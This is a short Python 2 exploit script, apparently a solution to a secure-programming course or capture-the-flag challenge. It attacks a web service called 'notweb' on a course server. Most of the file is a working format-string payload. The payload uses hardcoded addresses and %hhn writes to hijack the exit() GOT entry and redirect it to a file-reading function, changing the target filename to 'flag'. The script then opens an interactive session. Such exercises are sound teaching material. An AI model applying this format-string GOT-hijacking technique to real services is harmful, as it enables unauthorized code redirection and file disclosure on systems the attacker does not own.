#!/usr/bin/python2

import struct
from socket import *
import telnetlib
import re

# try to run the program with gdbserver:5566 over ncat
# bind the programe port to 10032
# ncat -vc 'gdbserver localhost:5566 ./notweb' -kl 10032

# attach to the gdb server
# gdb-peda$ target remote localhost:5566

ip = 'secprog.cs.nctu.edu.tw'
#ip = 'localhost'
port = 10032
soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# 0x080637e0 -> file (change to "flag")

# GOT hijacking, replace exit() with normal_file()
# when the program call exit(), it will make EIP point to normal_file() later

# 0x08048c8f -> normal_file
# 0x0804b03c -> exit

payload = "a"*112 + "GET /echo:\xe0\x37\x06\x08" + \
                         "\xe1\x37\x06\x08" + \
                         "\xe2\x37\x06\x08" +\
                         "\xe3\x37\x06\x08" +\
                         "\x3c\xb0\x04\x08" +\
                         "\x3d\xb0\x04\x08" +\
                         "\x3e\xb0\x04\x08" +\
                         "\x3f\xb0\x04\x08" +\
                         "%204c%15$hhn" + \
                         "%6c%16$hhn" + \
                         "%245c%17$hhn" + \
                         "%6c%18$hhn" + \
                         "%40c%19$hhn" + \
                         "%253c%20$hhn" + \
                         "%120c%21$hhn" + \
                         "%4c%22$hhn" + \
                         "\n"
print(len(payload))
soc.send(payload)
print("sent")



# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

